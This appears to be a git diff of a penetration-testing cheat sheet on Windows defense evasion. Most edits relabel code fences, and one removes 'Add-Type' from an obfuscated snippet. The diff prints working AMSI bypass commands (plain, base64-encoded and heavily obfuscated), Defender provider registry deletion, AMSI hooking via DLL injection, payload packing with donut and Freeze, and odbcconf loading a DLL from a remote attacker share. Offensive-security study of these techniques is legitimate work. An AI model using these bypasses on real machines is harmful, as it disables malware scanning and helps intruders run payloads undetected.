@@ -65,23 +65,23 @@
 
 ### Test String
 
-```console
+```cmd
 PS C:\> $str = 'amsiinitfailed'
 ```
 
 ### Simple Bypass
 
-```console
+```cmd
 PS C:\> $str = 'ams' + 'ii' + 'nitf' + 'ailed'
 ```
 
 ### Obfuscated Bypass Techniques
 
-```console
+```cmd
 PS C:\> [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
 ```
 
-```console
+```cmd
 PS C:\> S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
 ```
 
@@ -90,29 +90,29 @@ PS C:\> S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE]
 
 > https://github.com/senzee1984/Amsi_Bypass_In_2023
 
-```console
+```cmd
 PS C:\> $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}};$f.SetValue($null,$true)
 ```
 
-```console
+```cmd
 PS C:\>  $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);$ptr = [System.IntPtr]::Add([System.IntPtr]$g, 0x8);$buf = New-Object byte[](8);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 8)
 ```
 
 ### PowerShell Downgrade
 
-```console
+```cmd
 PS C:\> powershell -version 2
 ```
 
 ### Fabian Mosch / Matt Graeber Bypass
 
-```console
+```cmd
 PS C:\> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
 
 #### Base64 Encoded
 
-```console
+```cmd
 PS C:\> [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
 ```
 
@@ -122,7 +122,7 @@ PS C:\> [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]
 
 > https://github.com/tomcarver16/AmsiHook
 
-```console
+```cmd
 PS C:\> .\SimpleInjector.exe powershell.exe .\AMSIHook.dll
 ```
 
@@ -138,7 +138,7 @@ static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
 
 #### Load and Execute the DLL
 
-```console
+```cmd
 [System.Reflection.Assembly]::LoadFile("C:\Users\pentestlab\ASBBypass.dll")
 [Amsi]::Bypass()
 ```
@@ -147,7 +147,7 @@ The tool `AMSITrigger v3` can be used to discover the strings which are making c
 
 > https://github.com/RythmStick/AMSITrigger
 
-```console
+```cmd
 PS C:\> .\AmsiTrigger_x64.exe -i .\ASBBypass.ps1
 ```
 
@@ -155,7 +155,7 @@ Obfuscating the contained code within the script will evade `AMSI`.
 
 ```console
 ${_/==\_/\__/===\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABXAGkAbgAzADIAIAB7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAoAEkAbgB0AFAAdAByACAAaABNAG8AZAB1AGwAZQAsACAAcwB0AHIAaQBuAGcAIABwAHIAbwBjAE4AYQBtAGUAKQA7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAHMAdAByAGkAbgBnACAAbgBhAG0AZQApADsADQAKACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyACIAKQBdAA0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKABJAG4AdABQAHQAcgAgAGwAcABBAGQAZAByAGUAcwBzACwAIABVAEkAbgB0AFAAdAByACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABmAGwATgBlAHcAUAByAG8AdABlAGMAdAAsACAAbwB1AHQAIAB1AGkAbgB0ACAAbABwAGYAbABPAGwAZABQAHIAbwB0AGUAYwB0ACkAOwANAAoAfQA=')))
-Add-Type ${_/==\_/\__/===\_/}
+${_/==\_/\__/===\_/}
 ${__/=\/==\/\_/=\_/} = [Win32]::LoadLibrary("am" + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAC4AZABsAGwA'))))
 ${___/====\__/=====} = [Win32]::GetProcAddress(${__/=\/==\/\_/=\_/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQA='))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGEAbgA='))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))))
 ${/==\_/=\/\__/\/\/} = 0
@@ -168,13 +168,13 @@ ${_/\__/=\/\___/==\} = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 
 Forcing `AMSI` to fail (amsiInitFailed) will result that no scan will be initiated for the current process.
 
-```console
-PS C:\> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+```cmd
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
 
 Avoiding the use of strings with the usage of variables can also evade `AMSI`.
 
-```console
+```cmd
 $w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
 $assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
 $field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
@@ -183,7 +183,7 @@ $field.SetValue($null,$true)
 
 Forcing an error in order to send the flag in a legitimate way is another option. This bypass allocates a memory region for the `amsiContext` and since the `amsiSession` is set to null it will result an error.
 
-```console
+```cmd
 $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
 [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
 [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);
@@ -191,7 +191,7 @@ $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
 
 An obfuscated version of this bypass can be found on [AMSI.fail](https://amsi.fail/).
 
-```console
+```cmd
 $fwi=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((9076+8092-8092));[Ref].Assembly.GetType("System.Management.Automation.$([cHAr](65)+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))").GetField("$('àmsìSessîõn'.NoRMALiZe([char](70+54-54)+[cHaR](111)+[cHar](114+24-24)+[chaR](106+3)+[chAR](68+26-26)) -replace [CHAR](24+68)+[chaR]([BytE]0x70)+[CHar]([bYtE]0x7b)+[cHAr](77+45-45)+[chaR](62+48)+[CHAR](125*118/118))", "NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.$([cHAr](65)+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))").GetField("$([char]([bYtE]0x61)+[ChaR]([BYte]0x6d)+[Char](55+60)+[chAr](105+97-97)+[CHAr]([byTe]0x43)+[ChaR](111+67-67)+[char]([BytE]0x6e)+[cHaR]([bYtE]0x74)+[cHAr](101)+[CHar](120)+[cHAR](116))", "NonPublic,Static").SetValue($null, [IntPtr]$fwi);
 ```
 
@@ -200,14 +200,14 @@ $fwi=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((9076+8092-8092));[R
 `GUID` for Windows Defender.
 
 ```console
-KLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}
+HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}
 ```
 
 The key can be removed to stop the `AMSI provider` to perform `AMSI inspection` and evade the control.
 Notice that this requires elevated rights.
 
-```console
-Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
+```cmd
+PS C:\> Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
 ```
 
 ### DLL Hijacking
@@ -318,7 +318,7 @@ $ donut -a 2 -f 1 -o donutpayload.bin shellcode.exe
 
 ### Execution with Option on Target
 
-```console
+```cmd
 C:\> donut.exe -f 1 -p "triage /rpc" -i SharpDPAPI.exe
 ```
 
@@ -353,7 +353,7 @@ $ ./Freeze -I <FILE>.exe -encrypt -sandbox -process "C:\\Windows\\System32\\msed
 
 > https://github.com/danielbohannon/Invoke-Obfuscation
 
-```console
+```cmd
 PS C:\> Import-Module .\Invoke-Obfuscation.psd1
 PS C:\> Invoke-Obfuscation
 Invoke-Obfuscation> SET SCRIPTPATH C:\PATH\TO\FILE\<FILE>
@@ -427,13 +427,13 @@ $ mv <FILE>.dll <FILE>32.dll
 
 ### Execution
 
-```console
+```cmd
 PS C:\> rundll32.exe .\<FILE>32.dll,DllRegisterServer
 ```
 
 or
 
-```console
+```cmd
 PS C:\> regsvr32 /s .\<FILE>32.dll
 ```
 
@@ -441,7 +441,7 @@ For `.cpl-Files` a simple double click is enough to execute them.
 
 ### Evasion focused Execution
 
-```console
+```cmd
 PS C:\> odbcconf /s /a {regsvr \\<LHOST>\<FILE>.dll}
 PS C:\> odbcconf /s /a {regsvr \\<LHOST>\<FILE>_dll.txt}
 ```
